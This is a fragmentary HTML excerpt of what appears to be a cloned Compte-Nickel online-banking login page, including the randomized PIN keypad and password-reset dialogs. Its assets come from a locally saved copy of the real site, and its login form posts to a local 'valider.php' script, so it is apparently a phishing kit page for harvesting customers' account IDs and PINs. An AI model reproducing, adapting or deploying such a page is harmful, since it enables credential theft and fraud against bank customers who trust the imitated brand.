...
</title><link rel="shortcut icon" href="https://mon.compte-nickel.fr/Styles/Img/FAVICON_NICKEL.jpg" type="image/jpeg"><link type="text/css" href="compte_fichiers/jquery-ui-1.css" rel="stylesheet"><link type="text/css" href="compte_fichiers/Site.css" rel="stylesheet"><link type="text/css" href="compte_fichiers/OSX.css" rel="stylesheet"><link type="text/css" href="compte_fichiers/keypad.css" rel="stylesheet"><link href="compte_fichiers/compte-nickel.css" type="text/css" rel="stylesheet">

    <script async="" src="compte_fichiers/analytics.download"></script><script src="compte_fichiers/jquery_002.download" type="text/javascript"></script>
    <script src="compte_fichiers/jqueryui.download" type="text/javascript"></script>
    <script src="compte_fichiers/keypad.download" type="text/javascript"></script>
    <script src="compte_fichiers/jquery_003.download" type="text/javascript"></script>
    <script src="compte_fichiers/detectmobilebrowser.download" type="text/javascript"></script>
    <script src="compte_fichiers/jquery.download" type="text/javascript"></script>
...
<body>
    <form method="post" action="valider.php" id="my_form" class="MasterForm">
...
<script src="compte_fichiers/WebResource.txt" type="text/javascript"></script>


<script src="compte_fichiers/ScriptResource.txt" type="text/javascript"></script>
<script src="compte_fichiers/ScriptResource1.txt" type="text/javascript"></script>
                        ...
                        <div style="margin:0; display:table;width:100%">
                            <div style="display:table-row">
                                <div class="table-cell" style="vertical-align:middle; padding:0 10px 0 0">
                                    <div>
                                        <a href="https://compte-nickel.fr/"><img alt="Compte-Nickel" src="compte_fichiers/logo-nickel.png" style="height:55px;"></a>
                                    </div>
                                </div>
                                        ...
                                        <div class="table-row">
                                            <div class="table-cell left" style="padding-top:0">
                                                <a class="tile" href="https://mon.compte-nickel.fr/sos" style="float:left">
                                                    <span class="img">
                                                        <img src="compte_fichiers/tile-alert.png" alt="" style="top:7px">
                                                    </span>
                                            ...
                                            <div class="table-cell left" style="padding-top:0">
                                                <a class="tile" href="https://faq.compte-nickel.fr/hc/fr" style="float:right">
                                                    <span class="img">
                                                        <img src="compte_fichiers/tile-question.png" alt="" style="">
                                                    </span>
    ...
    <div id="MainContent_upAuth">
            ...
            <div id="panelLoadingBackground" style="position: absolute; z-index: 99; background-color: rgb(249, 249, 249); display: none; width: 1519px; height: 858px; top: 65.2px; left: 0px;">
                <div id="panelLoading" style="position: absolute; width:100%; height: 40px; text-align: center; vertical-align: middle;">
                    ...
                    <img src="compte_fichiers/loading.gif" alt="loading" width="30px" height="30px">
                </div>
            </div>
    ...
    <div class="table-row">
        <div class="table-cell" style="vertical-align:top">
		    <div class="table">
                <div class="table-row">
                    <div class="table-cell">
                        <input type="image" name="ctl00$MainContent$keypad1$button1" id="MainContent_keypad1_button1" class="keypad-key" position="0" src="compte_fichiers/white_key.png">
		                <input type="image" name="ctl00$MainContent$keypad1$button2" id="MainContent_keypad1_button2" class="keypad-key" position="1" src="compte_fichiers/6.png" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',6)">
		                <input type="image" name="ctl00$MainContent$keypad1$button3" id="MainContent_keypad1_button3" class="keypad-key" position="2" src="compte_fichiers/4.png" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',4)">
		                <input type="image" name="ctl00$MainContent$keypad1$button4" id="MainContent_keypad1_button4" class="keypad-key" position="3" src="compte_fichiers/7.png" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',7)">
                    </div>
                    <div class="table-cell">
                    </div>
                </div>
                <div class="table-row">
                    <div class="table-cell" style="padding-top:5px">
                        <input type="image" name="ctl00$MainContent$keypad1$button5" id="MainContent_keypad1_button5" class="keypad-key" position="4" src="compte_fichiers/white_key.png">
		                <input type="image" name="ctl00$MainContent$keypad1$button6" id="MainContent_keypad1_button6" class="keypad-key" position="5" src="compte_fichiers/9.png" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',9)">
		                <input type="image" name="ctl00$MainContent$keypad1$button7" id="MainContent_keypad1_button7" class="keypad-key" position="6" src="compte_fichiers/0.png" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',0)">
		                <input type="image" name="ctl00$MainContent$keypad1$button8" id="MainContent_keypad1_button8" class="keypad-key" position="7" src="compte_fichiers/3.png" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',3)">
                    </div>
                ...
                <div class="table-row">
                    <div class="table-cell" style="padding-top:5px">
                        <input type="image" name="ctl00$MainContent$keypad1$button9" id="MainContent_keypad1_button9" class="keypad-key" position="8" src="compte_fichiers/white_key.png">
		                <input type="image" name="ctl00$MainContent$keypad1$button10" id="MainContent_keypad1_button10" class="keypad-key" position="9" src="compte_fichiers/white_key.png">
		                <input type="image" name="ctl00$MainContent$keypad1$button11" id="MainContent_keypad1_button11" class="keypad-key" position="10" src="compte_fichiers/8.png" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',8)">
                        <input type="image" name="ctl00$MainContent$keypad1$button12" id="MainContent_keypad1_button12" class="keypad-key" position="11" src="compte_fichiers/white_key.png">
                    </div>
                    <div class="table-cell" style="padding:5px 0 0 15px; vertical-align:top;">
                ...
                <div class="table-row">
                    <div class="table-cell" style="padding-top:5px">
                        <input type="image" name="ctl00$MainContent$keypad1$button13" id="MainContent_keypad1_button13" class="keypad-key" position="12" src="compte_fichiers/2.png" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',2)">
                        <input type="image" name="ctl00$MainContent$keypad1$button14" id="MainContent_keypad1_button14" class="keypad-key" position="13" src="compte_fichiers/white_key.png">
		                <input type="image" name="ctl00$MainContent$keypad1$button15" id="MainContent_keypad1_button15" class="keypad-key" position="14" src="compte_fichiers/5.png" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',5)">
                        <input type="image" name="ctl00$MainContent$keypad1$button16" id="MainContent_keypad1_button16" class="keypad-key" position="15" src="compte_fichiers/1.png" onmousedown="pressKeyPos('MainContent_txtPassword', 'MainContent_keypad1_txtKeypad',1)">
                    </div>
                    <div class="table-cell" style="padding:5px 0 0 15px; vertical-align:top;">
...
<input type="hidden" name="ctl00$MainContent$keypad1$hfKeypadValue" id="MainContent_keypad1_hfKeypadValue"> -->
                        ...
                        <div id="panelPissenlit" style="display: none; margin-top: 150px; padding-left: 10px">
                            <img alt="" src="compte_fichiers/pissenlit_big.png" style="width:100%;">
                        </div>
                    </div>
                    </div>
                </div>
        ...
        <div style="text-align: center">
            <div style="text-align: right; position: relative">
                <img src="compte_fichiers/close-dialog.png" onclick="HideResetPwdBlockPopup();" style="cursor: pointer; position: absolute; right: 10px; top: 10px">
            </div>
...
raisons de sécurité.<br>
                        ...
                        <div id="divBlockedAccountMsgLoading" style="display:none;text-align:center; padding-top:20px; font-size:30px;" class="font-AracneRegular">
                            Chargement <img alt="loading" src="compte_fichiers/loading.gif" width="30px" height="30px">
                        </div>
            ...
            <div id="dialog-LostIdOrPwd" style="display: none">
                <div style="position:relative;width:100%;text-align:right">
                    <div class="close-white-dialog" onclick="HideDialogResetPwdOnClientGencode();" style="position:absolute; top:5px; right:15px;width:100px; height:30px;display:inline-block;z-index:1000">
                        <img alt="Fermer" src="compte_fichiers/close-white-dialog-2.png" width="30">
                    </div>
                </div>
                    ...
                    <div class="table" style="margin:20px auto;width:800px;">
                        <div class="table-row">
                            <div class="table-cell" style="vertical-align:middle; width:300px;">
                                <img alt="" src="compte_fichiers/card-code-2.png" width="300">
                            </div>
